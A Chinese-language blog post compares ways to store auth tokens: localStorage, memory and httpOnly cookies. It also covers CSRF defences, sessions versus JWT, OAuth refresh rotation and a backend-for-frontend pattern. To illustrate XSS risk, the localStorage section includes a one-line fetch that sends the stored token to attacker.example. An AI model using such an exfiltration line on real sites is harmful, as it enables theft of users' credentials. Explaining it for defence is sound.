+++
title = '存储 Auth Token 的方式'
date = 2026-07-27T15:12:32+08:00
draft = false
categories = ["Notes"]
tags = ["Notes", "Input"]

+++

> 一些粗略地见解，如有写错或低级错误，欢迎您的指正

### The basics

**JWT (JSON Web Token)** 是由三部分组成的字符串，用点进行分隔:
**header**, **payload**, 和 **signature**。

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsImlhdCI6MTc4NTE2MzUxOSwiZXhwIjoxNzg1MTY3MTE5fQ.TUsT1-hAgwPa9DUCLCDhtI0cNXkAWUHkGS3BJjulU40
```

Payload 里包含了关于用户的一些事实信息，比如说用户 ID，也可能包括角色 (role)

#### Validation 到底在验证什么

Signature（签名）**不是用来解码的，而是用来重新计算并比对的**。流程是：

```
1. 服务器拿到 token，拆成 header.payload.signature 三段
2. 服务器用自己保存的密钥（secret），对 header + payload 重新做一次 HMAC 运算
3. 把重新算出来的结果，跟 token 自带的 signature 做字符串比对
4. 一致 → 说明这个 token 从签发到现在没被篡改过，而且确实是"拿着这个密钥的人"（也就是你的后端自己）签发的
5. 不一致 → 拒绝，判定 token 无效/被篡改
```

#### 将 token 存放在 localStorage 之中

用户提交登录表单；服务器检查密码并返回 token。然后将 token 存放在 localStorage 里，然后从那以后每个请求都附加这个 token

- **前端**

```ts
async function login(email: string, password: string) {
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });

  const { token } = await res.json();
  localStorage.setItem("token", token);
}

async function fetchProfile() {
  const res = await fetch("/api/me", {
    headers: {
      Authorization: `Bearer ${localStorage.getItem("token")}`,
    },
  });
  return res.json();
}
```

- **简单 express 后端**

```js
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;
  const user = FAKE_USERS.find(
    (u) => u.email === email && u.password === password,
  );

  if (!user) {
    return res.status(401).json({ error: "账号或密码错误" });
  }

  const token = await signJWT(user.id);
  res.json({ token });
});
```

在服务器收到 token 之后，会重新计算这个 signature，检查是否匹配，匹配的话就直接信任这个 payload 里的内容，不用再去查任何东西。用户 ID 就在这个 token 里面，所以不需要去数据库里查一行记录来获取用户 ID 或验证用户身份

这个就叫作 **stateless**

JWT 本身是要用的，但是有个问题就是，我们应该将 JWT 存放在哪里

### 存在哪里: 三种选择

#### 1. localStorage

localStorage 的问题是**页面上任何一段 JavaScript 都能读它**，包括攻击者注入的那一段。一旦发生 XSS，攻击者只需要一行代码：

```ts
fetch("https://attacker.example/collect", {
  method: "POST",
  body: localStorage.getItem("token"),
});
```

token 就被搬走了。而且这个 token 离开浏览器之后**在任何网络环境下都依然有效**，直到它自己过期为止

> 关键点: localStorage 泄露的不是"这次会话"，而是**一份可以带走、离线复用的凭证**

#### 2. 内存变量 —— 看起来好一点，其实不实用

把 token 存在一个普通的 JS 变量里，攻击者得先知道这个变量的存在，门槛稍微高一点点

```ts
let accessToken: string | null = null;

async function login(email: string, password: string) {
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });

  const { token } = await res.json();
  accessToken = token; // lives in memory, never written to disk
}
```

但致命问题是: **刷新页面内存就清空了**，用户直接被登出。为了解决这个问题就得引入 refresh token，而 refresh token 又要找地方存 —— 绕回了原点

#### 3. httpOnly Cookie

现在就不像是刚刚，后端直接将 token 返回，然后前端将 token 存储在 localStorage 之中。而是通过 `res.cookie()` 写进 `Set-Cookie` 响应头，并加上四个关键的 flag:

**存储阶段:** 浏览器收到带 `Set-Cookie` 的响应后自动把这个 cookie 存起来，之后每次请求这个域名都会自动在请求头里带上 `Cookie: token=xxx`，前端代码完全不用手动管理 token (不用存 localStorage，也不用手动拼 `Authorization` 头)

```js
const token = await signJWT(user.id);
res.cookie("token", token, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  path: "/",
});

res.json({ ok: true });
```

浏览器会自动把 cookie 附加到请求上，但 `HttpOnly` 让 JavaScript 完全读不到它，`document.cookie` 里也看不见

```
Set-Cookie: __Host-session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

几个标志各管一件事:

- `HttpOnly`: 禁止 JS 读取. `document.cookie` 不会显示出来，没有脚本能读取它
- `Secure`: 只走 HTTPS
- `SameSite=Lax`: 限制跨站携带（顶层导航是例外）。当请求来自其他网站时，不要附加这个 cookie
- `Path=/`: 限定作用范围
- `__Host-` 前缀: 强制 `Secure`、禁止指定 `Domain`、要求 `Path=/`，就是后面三个条件 **必须同时满足**

这时前端没有 token需要管理，登录只是一个请求，后续请求只需发送凭证:

```ts
async function login(email: string, password: string) {
  await fetch("/api/login", {
    method: "POST",
    credentials: "include", // browser handles the cookie from here
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  // Nothing in the response body to store. There's no token in our code at all.
}

async function fetchProfile() {
  const res = await fetch("/api/me", { credentials: "include" });
  return res.json();
}
```

> **httpOnly 挡的是"偷走"，不是"滥用"**
> XSS 发生时，攻击者仍然可以借着用户当前这个浏览器发请求，但他没法把凭证拷贝出去在别的地方用

**普通 cookie（没有 `__Host-` 前缀）—— 每个属性各自独立，随便搭配**

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

这里的 `HttpOnly`、`Secure`、`SameSite`、`Path` **互相之间没有依赖关系**，你可以：

- 只写 `Secure`，不写 `HttpOnly`（能存，只是 JS 能读到）
- 只写 `Path=/api`，不写 `Domain`（能存，只是范围小一点）
- 加一个 `Domain=example.com`（能存，会被所有子域名共享）
- 甚至什么安全属性都不加，只写 `session=abc123`（能存，就是最不安全的裸奔版本）

`__Host-` 前缀 cookie —— 三个条件是"全有或全无"

```
Set-Cookie: __Host-session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

这里不一样，只要你**用了 `__Host-` 这个前缀命名**，浏览器就会做强制校验：

- 必须有 `Secure`
- 不能有 `Domain`
- 必须是 `Path=/`

### XSS 和 CSRF 是两种病，要两种药

**XSS (Cross-Site Scripting)**: 攻击者的代码跑在**你的页面上**

- 用 localStorage → token 当场被偷走
- 用 httpOnly cookie → 只能在当前这个标签页里搞破坏

**CSRF (Cross-Site Request Forgery)**: **别人的网站**骗浏览器发出一个用户本意之外的已认证请求

- cookie 是自动附加的 → 有 CSRF 风险
- localStorage 的 `Authorization` header 不会自动附加 → 因为外部网站无法读取你的 localStorage

所以从 localStorage 换到 cookie，等于是**用 CSRF 的麻烦换掉 XSS 的灾难**，那 CSRF 就得自己补上防御

### CSRF 的三层防御

#### 第一层: CSRF Token（主力）

服务器在页面上种一个不可预测的值，所有改状态的请求都必须把它放在自定义 header 里回传。别的站点上那个伪造的表单**读不到这个值**（同源策略拦着），所以伪造不出合法请求

> 常见做法是 double-submit: token 放在一个可读 cookie 里 + 变更请求时放进 header

- **前端**

```js
// 所有会改变状态的请求都走这里，统一带上 csrf header
async function post(path, body) {
  return fetch(path, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": getCsrfToken() ?? "",
    },
    body: JSON.stringify(body ?? {}),
  });
}

async function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const res = await post("/api/login", { email, password });
  const data = await res.json();

  if (!res.ok) {
    show("登录失败: " + JSON.stringify(data, null, 2));
    return;
  }
}
```

- **后端**

```js
// 注意: 这个 cookie 故意 不加 httpOnly，前端 JS 必须能读到它才能回传
function setCsrfCookie(res, value) {
  res.cookie("csrf_token", value, {
    httpOnly: false,
    secure: true,
    sameSite: "lax",
    path: "/",
  });
}
```

#### 第二层: SameSite（兜底）

`SameSite=Lax` / `Strict` 让 cookie 不跟着跨站请求走

两个坑:

- Lax 对**顶层 GET 导航**是放行的 → 所以 **GET 请求绝对不能改数据**
- "site" 不等于 "origin" → SameSite **防不住你自己的子域名之间**的攻击

#### 第三层: 校验 Origin（保险丝）

`Origin` 和 `Sec-Fetch-Site` 这两个 header 是浏览器加的，**前端伪造不了**。所有变更类请求，只要不是同源就直接丢掉

```ts
app.use((req, res, next) => {
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) {
    // 只对"会改数据"的请求方法做检查，GET 一般不该改数据，所以不查

    const site = req.get("Sec-Fetch-Site");
    // 读取浏览器自动加的这个 header 的值

    if (site && site !== "same-origin") {
      // 如果这个 header 存在，且值不是 "same-origin"
      // （意味着这是跨站或跨源发起的请求）
      return res.status(403).json({ error: "cross-site request rejected" });
      // 直接拒绝，403
    }
  }
  next();
  // 是同源请求，或者是安全的 GET 请求，放行
});
```

**`Origin` 和 `Sec-Fetch-Site` 分别是什么**

##### Origin

浏览器在发起**跨站请求**（以及大多数 POST 请求，不只是跨站）时，会自动带上这个 header，告诉服务器"这个请求是从哪个源发出的"：

```
Origin: https://evil-coupons.example
```

如果这个值不是你自己网站的域名，服务器就能判断"这不是从我自己网站发出的请求"。

##### Sec-Fetch-Site

这是浏览器自带的 **Fetch Metadata** 系列 header 之一，直接告诉服务器"这次请求和当前页面的关系是什么"，可能的值有：

```
Sec-Fetch-Site: same-origin   // 同源（比如 bank.example 请求 bank.example 自己的接口）
Sec-Fetch-Site: same-site     // 同站但不同源（比如 app.bank.example 请求 bank.example）
Sec-Fetch-Site: cross-site    // 完全跨站（比如 evil-coupons.example 请求 bank.example）
Sec-Fetch-Site: none          // 用户直接在地址栏输入网址访问，没有"发起页面"这个概念
```

### Session 还是 JWT

**存放位置--解决的是"会不会被偷/被伪造请求"**

```
localStorage → 怕 XSS（读取窃取）
Cookie       → 怕 CSRF（自动携带被滥用），但可以用 __Host- / CSRF Token / Origin 校验来防
```

**内容形态--解决的是 "能不能被主动吊销"**

```
Session ID（随机字符串，需要查表） → 服务器随时能让它失效（删一行记录）
JWT（自包含签名信息，免查表）      → 一旦签发，过期前无法撤销
```

这一点， **跟你放在哪（localStorage 还是 cookie）完全无关**——不管你把 JWT 放在多安全的 cookie 里（哪怕是 `__Host-` + CSRF Token + Origin 校验全套武装），**JWT 本身"没法被吊销"这个特性不会因为存储位置变安全就消失**。

#### JWT 的真正问题: 撤销不了

JWT 是 stateless 的，服务器不用查库 —— 听起来很高效

但反过来说: **一个 JWT 在过期之前一直有效，你没有办法把它作废**

- 用户登出 → token 还能用
- 改密码 / 封号 / 收回权限 → 全都要等到过期才生效

想解决就得在服务端维护一张吊销名单 —— 那其实就是**把 session 重新做了一遍，只是 token 更大了**

#### Session 的做法

session cookie 里只是一串**没有任何含义的随机字符串**，服务器拿它去数据库查当前用户状态。每个请求都查一次，所以登出、封号、权限变更**立刻生效**

```ts
app.post("/api/login", async (req, res) => {
  const user = await verifyPassword(req.body.email, req.body.password);
  const sessionId = crypto.randomBytes(32).toString("hex");
  await db.sessions.create({ id: sessionId, userId: user.id });
  res.cookie("__Host-session", sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    path: "/",
  });
  res.json({ ok: true });
});
```

登出就是删掉那行数据库记录，会话在所有地方同时失效

> **Session fixation 的坑**: 登录时、以及每次权限提升后（2FA、升管理员）都要**重新生成一个新的 session ID**，绝对不能复用客户端递过来的那个

```ts
// Runs before your routes. Reads the cookie, finds the user, or leaves it null.
app.use(async (req, res, next) => {
  const sessionId = req.cookies["__Host-session"];
  const session = sessionId ? await db.sessions.get(sessionId) : null;

  // Attach the user to the request so every route below can see it
  req.user = session ? await db.users.get(session.userId) : null;
  next();
});

// A protected route now reads req.user and trusts it, because the
// middleware already did the work.
app.get("/api/orders", async (req, res) => {
  if (!req.user) return res.status(401).json({ error: "not logged in" });
  res.json(await db.orders.findByUser(req.user.id));
});

app.post("/api/logout", async (req, res) => {
  const sessionId = req.cookies["__Host-session"];
  if (sessionId) await db.sessions.delete(sessionId); // the session is now gone, server-side

  res.clearCookie("__Host-session");
  res.json({ ok: true });
});
```

这种设计优于无状态的 JWT。用户的所有信息在每个请求都是最新的，因为是实时读取的，而不是信任一个小时前生成的 token

#### JWT 什么时候才是对的

JWT 擅长的场景是 **"验证一个 token" 比 "共享一个数据库" 更划算**的时候: 微服务之间、API 网关、SSO —— 每个服务各自独立验签

### OAuth: access token 和 refresh token 怎么放

OAuth 会给你两个 token，分开处理:

- **access token**: 生命周期短（5–15 分钟）→ 放**内存**里，被偷了窗口期也很窄
- **refresh token**: 生命周期长 → 放 httpOnly cookie，并且 `Path=/api/refresh`，**只发给这一个端点**

```ts
res.cookie("refresh_token", refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  path: "/api/refresh", // 只在这条路径下才会被浏览器自动带上
});
```

拿 refresh token，去换一个新的 access token

**具体流程**:

```
1. 用户登录成功
   → 服务器返回一个 access token（放前端内存里，短命，比如15分钟）
   → 服务器同时通过 Set-Cookie 设置 refresh token（httpOnly cookie，长命，比如7天，Path=/api/refresh）

2. 用户在页面上操作，正常带着内存里的 access token 请求各种接口
   fetch('/api/orders', { headers: { Authorization: `Bearer ${accessToken}` } })

3. 过了15分钟，access token 过期了，服务器返回 401

4. 前端发现 401，去调用 /api/refresh 这个特定端点：
   fetch('/api/refresh', { credentials: 'include' })
   // 这次请求不需要手动带 Authorization header
   // 浏览器看到路径匹配 /api/refresh，自动把 refresh token cookie 带上

5. 服务器在 /api/refresh 这个接口里：
   - 从 cookie 里读出 refresh token
   - 验证它是否有效（没过期、没被吊销）
   - 生成一个新的 access token，返回给前端
   - （如果开启了 rotation：同时生成一个新的 refresh token，替换掉旧的）

6. 前端拿到新的 access token，存回内存，重新发起第3步失败的那个请求
```

#### 轮换 (Rotation): 让被偷的凭证自己失效

每次 refresh 都作废上一个 refresh token 并发一个新的，形成一条链。如果服务器发现**同一个 refresh token 被用了两次**，说明有人在复用旧凭证 → 直接烧掉整条链，强制重新登录

> 这就是它的自愈性: **被偷的凭证会在下一个 refresh 周期里自己拆掉引信**

#### 并发 refresh 的坑

access token 一过期，同时在飞的好几个请求会**一起去调 refresh** —— 后面几个拿着已经作废的 token，直接把整条链烧了

解法是把那个正在进行的 Promise 存起来，让所有等待者都 await 同一个:

```ts
let refreshing: Promise<string> | null = null;

function refreshAccessToken() {
  if (!refreshing) {
    refreshing = fetch("/api/refresh", { credentials: "include" })
      .then(/* handle and store */)
      .finally(() => {
        refreshing = null;
      });
  }
  return refreshing;
}
```

#### 前端封一层就够了

把 fetch 包一层，自动带 token、遇到 401 就刷新并重试，组件完全不用知道 token 的存在

```ts
async function api(path: string, options: RequestInit = {}) {
  const res = await fetch(path, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
  });

  if (res.status === 401) {
    const fresh = await refreshAccessToken();
    return fetch(path, {
      ...options,
      headers: { ...options.headers, Authorization: `Bearer ${fresh}` },
    });
  }
  return res;
}
```

### BFF (Backend for Frontend): 让浏览器根本拿不到 token

最彻底的做法 —— 在 SPA 和真正的 API 之间放一层薄薄的服务器:

1. 浏览器手里只有一个 httpOnly session cookie（一串无意义的随机字符）
2. BFF 用 session ID 在**服务端**查出真正的 OAuth token
3. BFF 带着这些 token 去请求真正的 API
4. token 过期了，BFF 在**服务器之间**悄悄刷新，浏览器全程不参与
5. 刷新失败就删掉 session，把用户送回登录页

```ts
// The BFF. The browser only ever talks to this, never to the real API.
app.all("/api/*splat", async (req, res) => {
  // 1. The browser sent a session cookie, not a token.
  const sessionId = req.cookies["__Host-session"];
  const session = sessionId ? await sessions.get(sessionId) : null;
  if (!session) return res.status(401).json({ error: "not logged in" });

  // 2. Swap the cookie for the real access token, which never left this server.
  let accessToken = session.accessToken;

  // 3. If it has expired, refresh the server-to-server connection before forwarding. If the refresh
  // itself fails (token expired or revoked at the provider), the session is
  // over: kill it and make the browser log in again.
  if (Date.now() >= session.expiresAt) {
    try {
      const refreshed = await refreshWithProvider(session.refreshToken);
      accessToken = refreshed.accessToken;
      await sessions.update(sessionId, refreshed); // rotate + store the new pair
    } catch {
      await sessions.delete(sessionId);
      return res.status(401).json({ error: "session expired" });
    }
  }

  // 4. Forward the real API request with the bearer token that the browser never sees.
  // originalUrl keeps the query string; req.path would drop ?page=2.
  const upstream = await fetch(
    `https://api.example.com${req.originalUrl.replace("/api", "")}`,
    {
      method: req.method,
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": req.get("Content-Type") ?? "application/json",
      },
      body: ["GET", "HEAD"].includes(req.method)
        ? undefined
        : JSON.stringify(req.body),
    },
  );

  // Pass the status through. A 204 or other empty body has nothing to parse,
  // so guard the json() call or it throws.
  res.status(upstream.status);
  const text = await upstream.text();
  return text ? res.type("json").send(text) : res.end();
});
```

好处:

- token 从来没离开过服务器，**XSS 偷不走一个根本不存在的东西**
- 轮换全在服务器之间完成
- 应用从 OAuth 的 **public client** 升级成 **confidential client**（更强的流程）

代价: 多一层基础设施、每个请求两跳的延迟、扩容更复杂

## 📖 参考文献

1. https://neciudan.dev/most-secure-way-to-store-auth-token
